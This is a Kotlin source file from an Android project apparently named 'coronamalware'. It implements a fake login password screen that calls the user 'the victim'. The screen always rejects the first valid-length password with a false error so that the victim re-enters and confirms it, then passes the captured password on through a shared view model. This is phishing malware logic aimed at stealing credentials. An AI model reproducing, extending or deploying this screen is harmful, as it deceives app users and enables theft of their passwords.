package com.deniskrr.coronamalware.login

import android.os.Bundle
import android.os.Handler
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.inputmethod.EditorInfo
import androidx.fragment.app.Fragment
import androidx.fragment.app.activityViewModels
import androidx.navigation.fragment.findNavController
import com.deniskrr.coronamalware.R
import com.deniskrr.coronamalware.databinding.FakeLoginPasswordFragmentBinding
import com.deniskrr.coronamalware.hideSoftKeyboard

class FakeLoginPasswordFragment : Fragment() {

    private lateinit var binding: FakeLoginPasswordFragmentBinding
    private val viewModel: FakeLoginViewModel by activityViewModels()

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        binding = FakeLoginPasswordFragmentBinding.inflate(inflater)

        binding.btnSignInLogin.setOnClickListener {
            handlePassword()
        }

        binding.edittextPasswordLogin.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_DONE) {
                handlePassword()
                true
            } else {
                false
            }
        }

        binding.viewModel = viewModel
        binding.lifecycleOwner = this
        return binding.root
    }

    private fun handlePassword() {
        binding.progressLogin.visibility = View.VISIBLE
        hideSoftKeyboard()

        // Simulate loading
        Handler().postDelayed({
            binding.progressLogin.visibility = View.INVISIBLE
            val password = viewModel.password.value ?: ""

            // Check whether the victim entered a valid password or not
            if (password.length < 8) {
                binding.inputPasswordLogin.error =
                    getString(R.string.fake_password_error)
            } else if (!viewModel.wasPasswordChecked) {
                binding.inputPasswordLogin.error =
                    getString(R.string.fake_password_error)

                viewModel.wasPasswordChecked = true
            } else {
                findNavController().navigate(R.id.action_fakeLoginPassword_to_dashboard)
            }
        }, 1400)
    }

}
